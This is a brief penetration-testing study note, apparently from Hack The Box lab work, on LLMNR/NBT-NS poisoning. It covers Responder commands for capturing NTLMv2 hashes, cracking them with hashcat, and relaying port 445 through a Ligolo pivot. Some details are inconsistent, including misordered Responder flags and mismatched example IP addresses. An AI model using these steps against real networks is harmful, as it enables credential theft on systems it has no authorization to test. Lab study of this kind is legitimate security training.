Essentially, The LLMNR and NBT-NS are MS component that serves as an alternative when DNS fails itself, when LLMNR/NBT-NS is in use, any host can reply to them, thus enabling the LLMNR/NBT-NS Poisoning trick, we can do this as long as we have access to a network and if we are lucky, we can gain some credential pairs (given that we can crack the NTLMv2 hash slipped along with the username)

-Using responder for poisoning:
```
sudo responder -I -wf <interface> 
#Note: We should start this at the beginning over a tmux session while we perform other enumeration, this technique takes some time
```

Next, for all the obtained hash, we could simply have them cracked using hashcat with mode 5600, note that NTLMv2 hash cannot be used for PTH Attacks

Extra Notes when using reponder over ligolo:
**In order to get the Responder to work over Ligolo**, you need to set up a listener from the **local NIC** **port 445** (i.e. eth0) to your **tun0 VPN tunnel address with port 445 as well**.

Example: I have a Linux server between me and the AD machines, which are on the [**172.15.4.0/23**](http://172.15.4.0/23) subnet. The local IP of the pivot's interface that allows me to send requests to those machines is **172.15.5.115.** My IP on tun0 is [**10.10.xx.xxx**](http://10.10.xx.xxx), so the listener command be as follows:

**listener_add --addr** [**172.16.5.115:445**](http://172.16.5.115:445) **--to** [**10.10.XX.XXX:445**](http://10.10.XX.XXX:445)

**Use sudo both on pivot and attacker machine to work with ports under 1024! Otherwise ligolo will give you a permission denied error!**

That's it! Fire up your responder and it should work! (Ref: https://www.reddit.com/r/hackthebox/comments/1mwbvgq/is_it_possible_to_use_responder_over_ligolo/)

Ref: https://academy.hackthebox.com/app/module/143/section/1272